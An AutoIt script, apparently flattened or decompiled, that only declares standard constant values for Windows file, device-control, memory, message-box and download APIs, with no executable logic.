
Global Const $inet_localcache = 0x0
Global Const $inet_forcereload = 0x1
Global Const $inet_ignoressl = 0x2
Global Const $inet_asciitransfer = 0x4
Global Const $inet_binarytransfer = 0x8
Global Const $inet_forcebypass = 0x10
Global Const $inet_downloadwait = 0x0
Global Const $inet_downloadbackground = 0x1
Global Const $inet_downloadread = 0x0
Global Const $inet_downloadsize = 0x1
Global Const $inet_downloadcomplete = 0x2
Global Const $inet_downloadsuccess = 0x3
Global Const $inet_downloaderror = 0x4
Global Const $inet_downloadextended = 0x5
Global Const $mb_ok = 0x0
Global Const $mb_okcancel = 0x1
Global Const $mb_abortretryignore = 0x2
Global Const $mb_yesnocancel = 0x3
Global Const $mb_yesno = 0x4
Global Const $mb_retrycancel = 0x5
Global Const $mb_canceltrycontinue = 0x6
Global Const $mb_help = 0x4000
Global Const $mb_iconnone = 0x0
Global Const $mb_iconstop = 0x10
Global Const $mb_iconerror = 0x10
Global Const $mb_iconhand = 0x10
Global Const $mb_iconquestion = 0x20
Global Const $mb_iconexclamation = 0x30
Global Const $mb_iconwarning = 0x30
Global Const $mb_iconinformation = 0x40
Global Const $mb_iconasterisk = 0x40
Global Const $mb_usericon = 0x80
Global Const $mb_defbutton1 = 0x0
Global Const $mb_defbutton2 = 0x100
Global Const $mb_defbutton3 = 0x200
Global Const $mb_defbutton4 = 0x300
Global Const $mb_applmodal = 0x0
Global Const $mb_systemmodal = 0x1000
Global Const $mb_taskmodal = 0x2000
Global Const $mb_default_desktop_only = 0x20000
Global Const $mb_right = 0x80000
Global Const $mb_rtlreading = 0x100000
Global Const $mb_setforeground = 0x10000
Global Const $mb_topmost = 0x40000
Global Const $mb_service_notification = 0x200000
Global Const $mb_rightjustified = $mb_right
Global Const $idtimeout = +0xffffffff
Global Const $idok = 0x1
Global Const $idcancel = 0x2
Global Const $idabort = 0x3
Global Const $idretry = 0x4
Global Const $idignore = 0x5
Global Const $idyes = 0x6
Global Const $idno = 0x7
Global Const $idclose = 0x8
Global Const $idhelp = 0x9
Global Const $idtryagain = 0xa
Global Const $idcontinue = 0xb
Global Const $backup_alternate_data = 0x4
Global Const $backup_data = 0x1
Global Const $backup_ea_data = 0x2
Global Const $backup_link = 0x5
Global Const $backup_object_id = 0x7
Global Const $backup_property_data = 0x6
Global Const $backup_reparse_data = 0x8
Global Const $backup_security_data = 0x3
Global Const $backup_sparse_block = 0x9
Global Const $backup_txfs_data = 0xa
Global Const $copy_file_allow_decrypted_destination = 0x8
Global Const $copy_file_copy_symlink = 0x800
Global Const $copy_file_fail_if_exists = 0x1
Global Const $copy_file_no_buffering = 0x1000
Global Const $copy_file_open_source_for_write = 0x4
Global Const $copy_file_restartable = 0x2
Global Const $move_file_copy_allowed = 0x2
Global Const $move_file_create_hardlink = 0x10
Global Const $move_file_delay_until_reboot = 0x4
Global Const $move_file_fail_if_not_trackable = 0x20
Global Const $move_file_replace_existing = 0x1
Global Const $move_file_write_through = 0x8
Global Const $progress_continue = 0x0
Global Const $progress_cancel = 0x1
Global Const $progress_stop = 0x2
Global Const $progress_quiet = 0x3
Global Const $file_append_data = 0x4
Global Const $file_delete_child = 0x40
Global Const $file_execute = 0x20
Global Const $file_read_attributes = 0x80
Global Const $file_read_data = 0x1
Global Const $file_read_ea = 0x8
Global Const $file_write_attributes = 0x100
Global Const $file_write_data = 0x2
Global Const $file_write_ea = 0x10
Global Const $file_add_file = $file_write_data
Global Const $file_add_subdirectory = $file_append_data
Global Const $file_create_pipe_instance = $file_append_data
Global Const $file_list_directory = $file_read_data
Global Const $file_traverse = $file_execute
Global Const $file_all_access = 0x1f01ff
Global Const $file_flag_backup_semantics = 0x2000000
Global Const $file_flag_delete_on_close = 0x4000000
Global Const $file_flag_no_buffering = 0x20000000
Global Const $file_flag_open_no_recall = 0x100000
Global Const $file_flag_open_reparse_point = 0x200000
Global Const $file_flag_overlapped = 0x40000000
Global Const $file_flag_posix_semantics = 0x100000
Global Const $file_flag_random_access = 0x10000000
Global Const $file_flag_sequential_scan = 0x8000000
Global Const $file_flag_write_through = 0x80000000
Global Const $security_anonymous = 0x0
Global Const $security_context_tracking = 0x40000
Global Const $security_delegation = 0x30000
Global Const $security_effective_only = 0x80000
Global Const $security_identification = 0x10000
Global Const $security_impersonation = 0x20000
Global Const $sec_commit = 0x8000000
Global Const $sec_image = 0x1000000
Global Const $sec_large_pages = 0x80000000
Global Const $sec_nocache = 0x10000000
Global Const $sec_reserve = 0x4000000
Global Const $sec_writecombine = 0x40000000
Global Const $section_extend_size = 0x10
Global Const $section_map_execute = 0x8
Global Const $section_map_read = 0x4
Global Const $section_map_write = 0x2
Global Const $section_query = 0x1
Global Const $section_all_access = 0x1f001f
Global Const $file_map_copy = 0x1
Global Const $file_map_execute = 0x20
Global Const $file_map_read = 0x4
Global Const $file_map_write = 0x2
Global Const $file_map_all_access = $section_all_access
Global Const $ddd_exact_match_on_remove = 0x4
Global Const $ddd_no_broadcast_system = 0x8
Global Const $ddd_raw_target_path = 0x1
Global Const $ddd_remove_definition = 0x2
Global Const $fsctl_allow_extended_dasd_io = 0x90083
Global Const $fsctl_create_or_get_object_id = 0x900c0
Global Const $fsctl_create_usn_journal = 0x900e7
Global Const $fsctl_delete_object_id = 0x900a0
Global Const $fsctl_delete_reparse_point = 0x900ac
Global Const $fsctl_delete_usn_journal = 0x900f8
Global Const $fsctl_dismount_volume = 0x90020
Global Const $fsctl_dump_property_data = 0x90097
Global Const $fsctl_enable_upgrade = 0x980d0
Global Const $fsctl_encryption_fsctl_io = 0x900db
Global Const $fsctl_enum_usn_data = 0x900b3
Global Const $fsctl_extend_volume = 0x900f0
Global Const $fsctl_filesystem_get_statistics = 0x90060
Global Const $fsctl_find_files_by_sid = 0x9008f
Global Const $fsctl_get_compression = 0x9003c
Global Const $fsctl_get_ntfs_file_record = 0x90068
Global Const $fsctl_get_ntfs_volume_data = 0x90064
Global Const $fsctl_get_object_id = 0x9009c
Global Const $fsctl_get_reparse_point = 0x900a8
Global Const $fsctl_get_retrieval_pointers = 0x90073
Global Const $fsctl_get_volume_bitmap = 0x9006f
Global Const $fsctl_hsm_data = 0x9c113
Global Const $fsctl_hsm_msg = 0x9c108
Global Const $fsctl_invalidate_volumes = 0x90054
Global Const $fsctl_is_pathname_valid = 0x9002c
Global Const $fsctl_is_volume_dirty = 0x90078
Global Const $fsctl_is_volume_mounted = 0x90028
Global Const $fsctl_lock_volume = 0x90018
Global Const $fsctl_mark_as_system_hive = 0x9004f
Global Const $fsctl_mark_handle = 0x900fc
Global Const $fsctl_mark_volume_dirty = 0x90030
Global Const $fsctl_move_file = 0x90074
Global Const $fsctl_opbatch_ack_close_pending = 0x90010
Global Const $fsctl_oplock_break_ack_no_2 = 0x90050
Global Const $fsctl_oplock_break_acknowledge = 0x9000c
Global Const $fsctl_oplock_break_notify = 0x90014
Global Const $fsctl_query_allocated_ranges = 0x940cf
Global Const $fsctl_query_fat_bpb = 0x90058
Global Const $fsctl_query_retrieval_pointers = 0x9003b
Global Const $fsctl_query_usn_journal = 0x900f4
Global Const $fsctl_read_file_usn_data = 0x900eb
Global Const $fsctl_read_property_data = 0x90087
Global Const $fsctl_read_raw_encrypted = 0x900e3
Global Const $fsctl_read_usn_journal = 0x900bb
Global Const $fsctl_recall_file = 0x90117
Global Const $fsctl_request_batch_oplock = 0x90008
Global Const $fsctl_request_filter_oplock = 0x9005c
Global Const $fsctl_request_oplock_level_1 = 0x90000
Global Const $fsctl_request_oplock_level_2 = 0x90004
Global Const $fsctl_security_id_check = 0x940b7
Global Const $fsctl_set_compression = 0x9c040
Global Const $fsctl_set_encryption = 0x900d7
Global Const $fsctl_set_object_id = 0x90098
Global Const $fsctl_set_object_id_extended = 0x900bc
Global Const $fsctl_set_reparse_point = 0x900a4
Global Const $fsctl_set_sparse = 0x900c4
Global Const $fsctl_set_zero_data = 0x980c8
Global Const $fsctl_sis_copyfile = 0x90100
Global Const $fsctl_sis_link_files = 0x9c104
Global Const $fsctl_unlock_volume = 0x9001c
Global Const $fsctl_write_property_data = 0x9008b
Global Const $fsctl_write_raw_encrypted = 0x900df
Global Const $fsctl_write_usn_close_record = 0x900ef
Global Const $ioctl_aacs_end_session = 0x3350cc
Global Const $ioctl_aacs_generate_binding_nonce = 0x33d0f0
Global Const $ioctl_aacs_get_certificate = 0x3350d4
Global Const $ioctl_aacs_get_challenge_key = 0x3350d8
Global Const $ioctl_aacs_read_binding_nonce = 0x3350ec
Global Const $ioctl_aacs_read_media_id = 0x3350e8
Global Const $ioctl_aacs_read_media_key_block = 0x3350c4
Global Const $ioctl_aacs_read_media_key_block_size = 0x3350c0
Global Const $ioctl_aacs_read_serial_number = 0x3350e4
Global Const $ioctl_aacs_read_volume_id = 0x3350e0
Global Const $ioctl_aacs_send_certificate = 0x3350d0
Global Const $ioctl_aacs_send_challenge_key = 0x3350dc
Global Const $ioctl_aacs_start_session = 0x3350c8
Global Const $ioctl_ata_pass_through = 0x4d02c
Global Const $ioctl_ata_pass_through_direct = 0x4d030
Global Const $ioctl_cdrom_check_verify = 0x24800
Global Const $ioctl_cdrom_disk_type = 0x20040
Global Const $ioctl_cdrom_eject_media = 0x24808
Global Const $ioctl_cdrom_find_new_devices = 0x24818
Global Const $ioctl_cdrom_get_configuration = 0x24058
Global Const $ioctl_cdrom_get_control = 0x24034
Global Const $ioctl_cdrom_get_drive_geometry = 0x2404c
Global Const $ioctl_cdrom_get_drive_geometry_ex = 0x24050
Global Const $ioctl_cdrom_get_last_session = 0x24038
Global Const $ioctl_cdrom_get_volume = 0x24014
Global Const $ioctl_cdrom_load_media = 0x2480c
Global Const $ioctl_cdrom_media_removal = 0x24804
Global Const $ioctl_cdrom_pause_audio = 0x2400c
Global Const $ioctl_cdrom_play_audio_msf = 0x24018
Global Const $ioctl_cdrom_raw_read = 0x2403e
Global Const $ioctl_cdrom_read_q_channel = 0x2402c
Global Const $ioctl_cdrom_read_toc = 0x24000
Global Const $ioctl_cdrom_read_toc_ex = 0x24054
Global Const $ioctl_cdrom_release = 0x24814
Global Const $ioctl_cdrom_reserve = 0x24810
Global Const $ioctl_cdrom_resume_audio = 0x24010
Global Const $ioctl_cdrom_seek_audio_msf = 0x24004
Global Const $ioctl_cdrom_set_volume = 0x24028
Global Const $ioctl_cdrom_stop_audio = 0x24008
Global Const $ioctl_cdrom_unload_driver = 0x25008
Global Const $ioctl_disk_check_verify = 0x74800
Global Const $ioctl_disk_controller_number = 0x70044
Global Const $ioctl_disk_create_disk = 0x7c058
Global Const $ioctl_disk_delete_drive_layout = 0x7c100
Global Const $ioctl_disk_eject_media = 0x74808
Global Const $ioctl_disk_find_new_devices = 0x74818
Global Const $ioctl_disk_format_tracks = 0x7c018
Global Const $ioctl_disk_format_tracks_ex = 0x7c02c
Global Const $ioctl_disk_get_cache_information = 0x740d4
Global Const $ioctl_disk_get_drive_geometry = 0x70000
Global Const $ioctl_disk_get_drive_geometry_ex = 0x700a0
Global Const $ioctl_disk_get_drive_layout = 0x7400c
Global Const $ioctl_disk_get_drive_layout_ex = 0x70050
Global Const $ioctl_disk_get_length_info = 0x7405c
Global Const $ioctl_disk_get_media_types = 0x70c00
Global Const $ioctl_disk_get_partition_info = 0x74004
Global Const $ioctl_disk_get_partition_info_ex = 0x70048
Global Const $ioctl_disk_get_write_cache_state = 0x740dc
Global Const $ioctl_disk_grow_partition = 0x7c0d0
Global Const $ioctl_disk_histogram_data = 0x70034
Global Const $ioctl_disk_histogram_reset = 0x70038
Global Const $ioctl_disk_histogram_structure = 0x70030
Global Const $ioctl_disk_internal_clear_verify = 0x70407
Global Const $ioctl_disk_internal_set_notify = 0x70408
Global Const $ioctl_disk_internal_set_verify = 0x70403
Global Const $ioctl_disk_is_writable = 0x70024
Global Const $ioctl_disk_load_media = 0x7480c
Global Const $ioctl_disk_logging = 0x70028
Global Const $ioctl_disk_media_removal = 0x74804
Global Const $ioctl_disk_performance = 0x70020
Global Const $ioctl_disk_performance_off = 0x70060
Global Const $ioctl_disk_reassign_blocks = 0x7c01c
Global Const $ioctl_disk_release = 0x74814
Global Const $ioctl_disk_request_data = 0x70040
Global Const $ioctl_disk_request_structure = 0x7003c
Global Const $ioctl_disk_reserve = 0x74810
Global Const $ioctl_disk_set_cache_information = 0x7c0d8
Global Const $ioctl_disk_set_drive_layout = 0x7c010
Global Const $ioctl_disk_set_drive_layout_ex = 0x7c054
Global Const $ioctl_disk_set_partition_info = 0x7c008
Global Const $ioctl_disk_set_partition_info_ex = 0x7c04c
Global Const $ioctl_disk_update_drive_size = 0x7c0c8
Global Const $ioctl_disk_update_properties = 0x70140
Global Const $ioctl_disk_verify = 0x70014
Global Const $ioctl_dvd_end_session = 0x33500c
Global Const $ioctl_dvd_get_region = 0x335014
Global Const $ioctl_dvd_read_key = 0x335004
Global Const $ioctl_dvd_read_structure = 0x335140
Global Const $ioctl_dvd_send_key = 0x335008
Global Const $ioctl_dvd_send_key2 = 0x33d018
Global Const $ioctl_dvd_set_read_ahead = 0x335010
Global Const $ioctl_dvd_start_session = 0x335000
Global Const $ioctl_mountdev_link_created = 0x4d0010
Global Const $ioctl_mountdev_link_deleted = 0x4d0014
Global Const $ioctl_mountdev_query_stable_guid = 0x4d0018
Global Const $ioctl_mountdev_query_suggested_link_name = 0x4d000c
Global Const $ioctl_mountdev_query_unique_id = 0x4d0000
Global Const $ioctl_mountdev_unique_id_change_notify = 0x4d0004
Global Const $ioctl_mountmgr_auto_dl_assignments = 0x6dc014
Global Const $ioctl_mountmgr_change_notify = 0x6d4020
Global Const $ioctl_mountmgr_check_unprocessed_volumes = 0x6d4028
Global Const $ioctl_mountmgr_create_point = 0x6dc000
Global Const $ioctl_mountmgr_delete_points = 0x6dc004
Global Const $ioctl_mountmgr_delete_points_dbonly = 0x6dc00c
Global Const $ioctl_mountmgr_keep_links_when_offline = 0x6dc024
Global Const $ioctl_mountmgr_next_drive_letter = 0x6dc010
Global Const $ioctl_mountmgr_query_dos_volume_path = 0x6d0030
Global Const $ioctl_mountmgr_query_dos_volume_paths = 0x6d0034
Global Const $ioctl_mountmgr_query_points = 0x6d0008
Global Const $ioctl_mountmgr_volume_arrival_notification = 0x6d402c
Global Const $ioctl_mountmgr_volume_mount_point_created = 0x6dc018
Global Const $ioctl_mountmgr_volume_mount_point_deleted = 0x6dc01c
Global Const $ioctl_scsi_get_inquiry_data = 0x4100c
Global Const $ioctl_scsi_get_capabilities = 0x41010
Global Const $ioctl_scsi_get_address = 0x41018
Global Const $ioctl_scsi_miniport = 0x4d008
Global Const $ioctl_scsi_pass_through = 0x4d004
Global Const $ioctl_scsi_pass_through_direct = 0x4d014
Global Const $ioctl_scsi_rescan_bus = 0x4101c
Global Const $ioctl_storage_break_reservation = 0x2d5014
Global Const $ioctl_storage_check_verify = 0x2d4800
Global Const $ioctl_storage_check_verify2 = 0x2d0800
Global Const $ioctl_storage_eject_media = 0x2d4808
Global Const $ioctl_storage_ejection_control = 0x2d0940
Global Const $ioctl_storage_find_new_devices = 0x2d4818
Global Const $ioctl_storage_get_device_number = 0x2d1080
Global Const $ioctl_storage_get_hotplug_info = 0x2d0c14
Global Const $ioctl_storage_get_media_serial_number = 0x2d0c10
Global Const $ioctl_storage_get_media_types = 0x2d0c00
Global Const $ioctl_storage_get_media_types_ex = 0x2d0c04
Global Const $ioctl_storage_load_media = 0x2d480c
Global Const $ioctl_storage_load_media2 = 0x2d080c
Global Const $ioctl_storage_manage_data_set_attributes = 0x2d9404
Global Const $ioctl_storage_mcn_control = 0x2d0944
Global Const $ioctl_storage_media_removal = 0x2d4804
Global Const $ioctl_storage_persistent_reserve_in = 0x2d5018
Global Const $ioctl_storage_persistent_reserve_out = 0x2d501c
Global Const $ioctl_storage_predict_failure = 0x2d1100
Global Const $ioctl_storage_query_property = 0x2d1400
Global Const $ioctl_storage_release = 0x2d4814
Global Const $ioctl_storage_reserve = 0x2d4810
Global Const $ioctl_storage_reset_bus = 0x2d5000
Global Const $ioctl_storage_reset_device = 0x2d5004
Global Const $ioctl_storage_set_hotplug_info = 0x2dcc18
Global Const $ioctl_storage_set_read_ahead = 0x2d4400
Global Const $ioctl_volume_get_gpt_attributes = 0x560038
Global Const $ioctl_volume_get_volume_disk_extents = 0x560000
Global Const $ioctl_volume_is_clustered = 0x560030
Global Const $ioctl_volume_is_io_capable = 0x560014
Global Const $ioctl_volume_is_offline = 0x560010
Global Const $ioctl_volume_is_partition = 0x560028
Global Const $ioctl_volume_logical_to_physical = 0x560020
Global Const $ioctl_volume_offline = 0x56c00c
Global Const $ioctl_volume_online = 0x56c008
Global Const $ioctl_volume_physical_to_logical = 0x560024
Global Const $ioctl_volume_query_failover_set = 0x560018
Global Const $ioctl_volume_query_volume_number = 0x56001c
Global Const $ioctl_volume_read_plex = 0x56402e
Global Const $ioctl_volume_set_gpt_attributes = 0x560034
Global Const $ioctl_volume_supports_online_offline = 0x560004
Global Const $smart_get_version = 0x74080
Global Const $smart_rcv_drive_data = 0x7c088
Global Const $smart_send_drive_command = 0x7c084
Global Const $file_encryptable = 0x0
Global Const $file_is_encrypted = 0x1
Global Const $file_read_only = 0x8
Global Const $file_root_dir = 0x3
Global Const $file_system_attr = 0x2
Global Const $file_system_dir = 0x4
Global Const $file_system_not_support = 0x6
Global Const $file_unknown = 0x5
Global Const $file_user_disallowed = 0x7
Global Const $scs_32bit_binary = 0x0
Global Const $scs_64bit_binary = 0x6
Global Const $scs_dos_binary = 0x1
Global Const $scs_os216_binary = 0x5
Global Const $scs_pif_binary = 0x3
Global Const $scs_posix_binary = 0x4
Global Const $scs_wow_binary = 0x2
Global Const $drive_bus_type_unknown = 0x0
Global Const $drive_bus_type_scsi = 0x1
Global Const $drive_bus_type_atapi = 0x2
Global Const $drive_bus_type_ata = 0x3
Global Const $drive_bus_type_1394 = 0x4
Global Const $drive_bus_type_ssa = 0x5
Global Const $drive_bus_type_fibre = 0x6
Global Const $drive_bus_type_usb = 0x7
Global Const $drive_bus_type_raid = 0x8
Global Const $drive_bus_type_iscsi = 0x9
Global Const $drive_bus_type_sas = 0xa
Global Const $drive_bus_type_sata = 0xb
Global Const $drive_bus_type_sd = 0xc
Global Const $drive_bus_type_mmc = 0xd
Global Const $drive_unknown = 0x0
Global Const $drive_no_root_dir = 0x1
Global Const $drive_removable = 0x2
Global Const $drive_fixed = 0x3
Global Const $drive_remote = 0x4
Global Const $drive_cdrom = 0x5
Global Const $drive_ramdisk = 0x6
Global Const $file_type_char = 0x2
Global Const $file_type_disk = 0x1
Global Const $file_type_pipe = 0x3
Global Const $file_type_remote = 0x8000
Global Const $file_type_unknown = 0x0
Global Const $file_name_normalized = 0x0
Global Const $file_name_opened = 0x8
Global Const $volume_name_dos = 0x0
Global Const $volume_name_guid = 0x1
Global Const $volume_name_none = 0x4
Global Const $volume_name_nt = 0x2
Global Const $image_file_machine_unknown = 0x0
Global Const $image_file_machine_am33 = 0x1d3
Global Const $image_file_machine_amd64 = 0x8664
Global Const $image_file_machine_arm = 0x1c0
Global Const $image_file_machine_ebc = 0xebc
Global Const $image_file_machine_i386 = 0x14c
Global Const $image_file_machine_ia64 = 0x200
Global Const $image_file_machine_m32r = 0x9041
Global Const $image_file_machine_mips16 = 0x266
Global Const $image_file_machine_mipsfpu = 0x366
Global Const $image_file_machine_mipsfpu16 = 0x466
Global Const $image_file_machine_powerpc = 0x1f0
Global Const $image_file_machine_powerpcfp = 0x1f1
Global Const $image_file_machine_r4000 = 0x166
Global Const $image_file_machine_sh3 = 0x1a2
Global Const $image_file_machine_sh3dsp = 0x1a3
Global Const $image_file_machine_sh4 = 0x1a6
Global Const $image_file_machine_sh5 = 0x1a8
Global Const $image_file_machine_thumb = 0x1c2
Global Const $image_file_machine_wcemipsv2 = 0x169
Global Const $file_case_preserved_names = 0x2
Global Const $file_case_sensitive_search = 0x1
Global Const $file_file_compression = 0x10
Global Const $file_named_streams = 0x40000
Global Const $file_persistent_acls = 0x8
Global Const $file_read_only_volume = 0x80000
Global Const $file_sequential_write_once = 0x100000
Global Const $file_supports_encryption = 0x20000
Global Const $file_supports_extended_attributes = 0x800000
Global Const $file_supports_hard_links = 0x400000
Global Const $file_supports_object_ids = 0x10000
Global Const $file_supports_open_by_file_id = 0x1000000
Global Const $file_supports_reparse_points = 0x80
Global Const $file_supports_sparse_files = 0x40
Global Const $file_supports_transactions = 0x200000
Global Const $file_supports_usn_journal = 0x2000000
Global Const $file_unicode_on_disk = 0x4
Global Const $file_volume_is_compressed = 0x8000
Global Const $file_volume_quotas = 0x20
Global Const $file_device_8042_port = 0x27
Global Const $file_device_acpi = 0x32
Global Const $file_device_battery = 0x29
Global Const $file_device_beep = 0x1
Global Const $file_device_bus_extender = 0x2a
Global Const $file_device_cd_rom = 0x2
Global Const $file_device_cd_rom_file_system = 0x3
Global Const $file_device_changer = 0x30
Global Const $file_device_controller = 0x4
Global Const $file_device_datalink = 0x5
Global Const $file_device_dfs = 0x6
Global Const $file_device_dfs_file_system = 0x35
Global Const $file_device_dfs_volume = 0x36
Global Const $file_device_disk = 0x7
Global Const $file_device_disk_file_system = 0x8
Global Const $file_device_dvd = 0x33
Global Const $file_device_file_system = 0x9
Global Const $file_device_fips = 0x3a
Global Const $file_device_fullscreen_video = 0x34
Global Const $file_device_inport_port = 0xa
Global Const $file_device_keyboard = 0xb
Global Const $file_device_ks = 0x2f
Global Const $file_device_ksec = 0x39
Global Const $file_device_mailslot = 0xc
Global Const $file_device_mass_storage = 0x2d
Global Const $file_device_midi_in = 0xd
Global Const $file_device_midi_out = 0xe
Global Const $file_device_modem = 0x2b
Global Const $file_device_mouse = 0xf
Global Const $file_device_multi_unc_provider = 0x10
Global Const $file_device_named_pipe = 0x11
Global Const $file_device_network = 0x12
Global Const $file_device_network_browser = 0x13
Global Const $file_device_network_file_system = 0x14
Global Const $file_device_network_redirector = 0x28
Global Const $file_device_null = 0x15
Global Const $file_device_parallel_port = 0x16
Global Const $file_device_physical_netcard = 0x17
Global Const $file_device_printer = 0x18
Global Const $file_device_scanner = 0x19
Global Const $file_device_screen = 0x1c
Global Const $file_device_serenum = 0x37
Global Const $file_device_serial_mouse_port = 0x1a
Global Const $file_device_serial_port = 0x1b
Global Const $file_device_smartcard = 0x31
Global Const $file_device_smb = 0x2e
Global Const $file_device_sound = 0x1d
Global Const $file_device_streams = 0x1e
Global Const $file_device_tape = 0x1f
Global Const $file_device_tape_file_system = 0x20
Global Const $file_device_termsrv = 0x38
Global Const $file_device_transport = 0x21
Global Const $file_device_unknown = 0x22
Global Const $file_device_vdm = 0x2c
Global Const $file_device_video = 0x23
Global Const $file_device_virtual_disk = 0x24
Global Const $file_device_wave_in = 0x25
Global Const $file_device_wave_out = 0x26
Global Const $file_any_access = 0x0
Global Const $file_special_access = $file_any_access
Global Const $file_read_access = 0x1
Global Const $file_write_access = 0x2
Global Const $method_buffered = 0x0
Global Const $method_in_direct = 0x1
Global Const $method_out_direct = 0x2
Global Const $method_neither = 0x3
Global Const $file_notify_change_file_name = 0x1
Global Const $file_notify_change_dir_name = 0x2
Global Const $file_notify_change_attributes = 0x4
Global Const $file_notify_change_size = 0x8
Global Const $file_notify_change_last_write = 0x10
Global Const $file_notify_change_last_access = 0x20
Global Const $file_notify_change_creation = 0x40
Global Const $file_notify_change_security = 0x100
Global Const $file_action_added = 0x1
Global Const $file_action_removed = 0x2
Global Const $file_action_modified = 0x3
Global Const $file_action_renamed_old_name = 0x4
Global Const $file_action_renamed_new_name = 0x5
Global Const $replacefile_write_through = 0x1
Global Const $replacefile_ignore_merge_errors = 0x2
Global Const $replacefile_ignore_acl_errors = 0x4
Global Const $base_search_path_enable_safe_searchmode = 0x1
Global Const $base_search_path_disable_safe_searchmode = 0x10000
Global Const $base_search_path_permanent = 0x8000
Global Const $fc_nooverwrite = 0x0
Global Const $fc_overwrite = 0x1
Global Const $fc_createpath = 0x8
Global Const $ft_modified = 0x0
Global Const $ft_created = 0x1
Global Const $ft_accessed = 0x2
Global Const $ft_array = 0x0
Global Const $ft_string = 0x1
Global Const $ft_msec = 0x2
Global Const $ft_utc = 0x4
Global Const $fsf_createbutton = 0x1
Global Const $fsf_newdialog = 0x2
Global Const $fsf_editcontrol = 0x4
Global Const $ft_nonrecursive = 0x0
Global Const $ft_recursive = 0x1
Global Const $fo_read = 0x0
Global Const $fo_append = 0x1
Global Const $fo_overwrite = 0x2
Global Const $fo_createpath = 0x8
Global Const $fo_binary = 0x10
Global Const $fo_unicode = 0x20
Global Const $fo_utf16_le = 0x20
Global Const $fo_utf16_be = 0x40
Global Const $fo_utf8 = 0x80
Global Const $fo_utf8_nobom = 0x100
Global Const $fo_ansi = 0x200
Global Const $fo_utf16_le_nobom = 0x400
Global Const $fo_utf16_be_nobom = 0x800
Global Const $fo_utf8_full = 0x4000
Global Const $fo_fullfile_detect = 0x4000
Global Const $eof = +0xffffffff
Global Const $fd_filemustexist = 0x1
Global Const $fd_pathmustexist = 0x2
Global Const $fd_multiselect = 0x4
Global Const $fd_promptcreatenew = 0x8
Global Const $fd_promptoverwrite = 0x10
Global Const $create_new = 0x1
Global Const $create_always = 0x2
Global Const $open_existing = 0x3
Global Const $open_always = 0x4
Global Const $truncate_existing = 0x5
Global Const $invalid_set_file_pointer = +0xffffffff
Global Const $file_begin = 0x0
Global Const $file_current = 0x1
Global Const $file_end = 0x2
Global Const $file_attribute_readonly = 0x1
Global Const $file_attribute_hidden = 0x2
Global Const $file_attribute_system = 0x4
Global Const $file_attribute_directory = 0x10
Global Const $file_attribute_archive = 0x20
Global Const $file_attribute_device = 0x40
Global Const $file_attribute_normal = 0x80
Global Const $file_attribute_temporary = 0x100
Global Const $file_attribute_sparse_file = 0x200
Global Const $file_attribute_reparse_point = 0x400
Global Const $file_attribute_compressed = 0x800
Global Const $file_attribute_offline = 0x1000
Global Const $file_attribute_not_content_indexed = 0x2000
Global Const $file_attribute_encrypted = 0x4000
Global Const $file_share_read = 0x1
Global Const $file_share_write = 0x2
Global Const $file_share_delete = 0x4
Global Const $file_share_readwrite = BitOR($file_share_read, $file_share_write)
Global Const $file_share_any = BitOR($file_share_read, $file_share_write, $file_share_delete)
Global Const $generic_all = 0x10000000
Global Const $generic_execute = 0x20000000
Global Const $generic_write = 0x40000000
Global Const $generic_read = 0x80000000
Global Const $generic_readwrite = BitOR($generic_read, $generic_write)
Global Const $file_encoding_utf16le = 0x20
Global Const $fe_entire_utf8 = 0x1
Global Const $fe_partialfirst_utf8 = 0x2
Global Const $fn_fullpath = 0x0
Global Const $fn_relativepath = 0x1
Global Const $fv_comments = "Comments"
Global Const $fv_companyname = "CompanyName"
Global Const $fv_filedescription = "FileDescription"
Global Const $fv_fileversion = "FileVersion"
Global Const $fv_internalname = "InternalName"
Global Const $fv_legalcopyright = "LegalCopyright"
Global Const $fv_legaltrademarks = "LegalTrademarks"
Global Const $fv_originalfilename = "OriginalFilename"
Global Const $fv_productname = "ProductName"
Global Const $fv_productversion = "ProductVersion"
Global Const $fv_privatebuild = "PrivateBuild"
Global Const $fv_specialbuild = "SpecialBuild"
Global Const $frta_nocount = 0x0
Global Const $frta_count = 0x1
Global Const $frta_intarrays = 0x2
Global Const $frta_entiresplit = 0x4
Global Const $flta_filesfolders = 0x0
Global Const $flta_files = 0x1
Global Const $flta_folders = 0x2
Global Const $fltar_filesfolders = 0x0
Global Const $fltar_files = 0x1
Global Const $fltar_folders = 0x2
Global Const $fltar_nohidden = 0x4
Global Const $fltar_nosystem = 0x8
Global Const $fltar_nolink = 0x10
Global Const $fltar_norecur = 0x0
Global Const $fltar_recur = 0x1
Global Const $fltar_nosort = 0x0
Global Const $fltar_sort = 0x1
Global Const $fltar_fastsort = 0x2
Global Const $fltar_nopath = 0x0
Global Const $fltar_relpath = 0x1
Global Const $fltar_fullpath = 0x2
Global Const $path_original = 0x0
Global Const $path_drive = 0x1
Global Const $path_directory = 0x2
Global Const $path_filename = 0x3
Global Const $path_extension = 0x4
Global Const $gmem_fixed = 0x0
Global Const $gmem_moveable = 0x2
Global Const $gmem_nocompact = 0x10
Global Const $gmem_nodiscard = 0x20
Global Const $gmem_zeroinit = 0x40
Global Const $gmem_modify = 0x80
Global Const $gmem_discardable = 0x100
Global Const $gmem_not_banked = 0x1000
Global Const $gmem_share = 0x2000
Global Const $gmem_ddeshare = 0x2000
Global Const $gmem_notify = 0x4000
Global Const $gmem_lower = 0x1000
Global Const $gmem_valid_flags = 0x7f72
Global Const $gmem_invalid_handle = 0x8000
Global Const $gptr = BitOR($gmem_fixed, $gmem_zeroinit)
Global Const $ghnd = BitOR($gmem_moveable, $gmem_zeroinit)
Global Const $mem_commit = 0x1000
Global Const $mem_reserve = 0x2000
Global Const $mem_top_down = 0x100000
Global Const $mem_shared = 0x8000000
Global Const $page_noaccess = 0x1
Global Const $page_readonly = 0x2
Global Const $page_readwrite = 0x4
Global Const $page_execute = 0x10
Global Const $page_execute_read = 0x20
Global Const $page_execute_readwrite = 0x40
Global Const $page_execute_writecopy = 0x80
Global Const $page_guard = 0x100
Global Const $page_nocache = 0x200
Global Const $page_writecombine = 0x400
Global Const $page_writecopy = 0x8
Global Const $mem_decommit = 0x4000
Global Const $mem_release = 0x8000
Global Enum $mem_load, $mem_totalphysram, $mem_availphysram, $mem_totalpagefile, $mem_availpagefile, $mem_totalvirtual, $mem_availvirtual
Global Const $str_nocasesense = 0x0
Global Const $str_casesense = 0x1
Global Const $str_nocasesensebasic = 0x2
Global Const $str_stripleading = 0x1
Global Const $str_striptrailing = 0x2
Global Const $str_stripspaces = 0x4
Global Const $str_stripall = 0x8
Global Const $str_chrsplit = 0x0
Global Const $str_entiresplit = 0x1
Global Const $str_nocount = 0x2
